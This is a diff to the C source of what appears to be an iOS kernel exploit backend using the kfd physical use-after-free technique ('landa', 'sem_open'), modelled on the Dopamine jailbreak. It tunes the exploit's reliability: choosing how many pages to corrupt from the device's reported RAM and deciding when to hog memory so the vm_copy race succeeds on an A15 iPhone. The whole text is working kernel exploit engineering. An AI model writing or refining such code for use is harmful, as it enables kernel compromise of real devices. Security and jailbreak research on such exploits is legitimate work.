@@ -269,14 +269,24 @@ static size_t g_keHogSize = 0;
 static int32_t g_keOldMemLimit = 0;
 static bool g_keHogInsufficient = false;
 
-static uint32_t keKfdAutoPuafPages(void)
+static uint64_t keKfdDeviceMemory(void)
 {
     uint64_t memsize = 0;
     size_t size = sizeof(memsize);
-    // 256 pages (4 MiB): goal = 64 free pages — much easier to reach on a busy
-    // system than Serotonin's 1024, and 16x fewer pages to corrupt on failure.
-    (void)memsize;
-    return 1024;
+    if (sysctlbyname("hw.memsize", &memsize, &size, NULL, 0) != 0) return 0;
+    return memsize;
+}
+
+static uint32_t keKfdAutoPuafPages(void)
+{
+    // Dopamine 2.x (opa334, kfd.m): hw.memsize reports RAM after carveouts, so
+    // compare against a value below the real amount.
+    //   >= 5 GiB (6 GB devices) -> 3072: "remarkably more reliable with 3072"
+    //   otherwise               -> 512
+    // A9/A8 adjustments are irrelevant for A15 (iPhone13,2).
+    uint64_t device_memory = keKfdDeviceMemory();
+    if (device_memory >= 1024ULL * 1024ULL * 1024ULL * 5ULL) return 3072;
+    return 512;
 }
 
 static void keKfdHogMemory(size_t headroomMB, uint32_t puafPages)
@@ -370,10 +380,19 @@ int keKfdInit(KEBackendID backend, const KEConfig *config)
 
     uint32_t puafPages = config->puafPages ? config->puafPages : keKfdAutoPuafPages();
 
-    keKfdHogMemory(1000, puafPages);
-    if (g_keHogInsufficient) {
-        keKfdUnhogMemory();
-        return KE_ERR_EXPLOIT_FAILED;
+    // Dopamine 2.x hog policy: hog ONLY on 16 GB devices (> 12 GiB by hw.memsize).
+    // On 6 GB devices (iPhone13,2) Dopamine hogs nothing — the hog squeezes the
+    // free list the vm_copy claim races against and makes sem_open MISS.
+    uint64_t device_memory = keKfdDeviceMemory();
+    if (device_memory > 1024ULL * 1024ULL * 1024ULL * 12ULL) {
+        keKfdHogMemory(512, puafPages);
+        if (g_keHogInsufficient) {
+            keKfdUnhogMemory();
+            return KE_ERR_EXPLOIT_FAILED;
+        }
+    } else {
+        KE_LOG("kfd: no hog on this device (hw.memsize=%llu MiB), puaf=%u pages",
+               (unsigned long long)(device_memory >> 20), puafPages);
     }
 
     KE_LOG("kfd: performing kopen (puaf=%u pages, landa + sem_open)", puafPages);
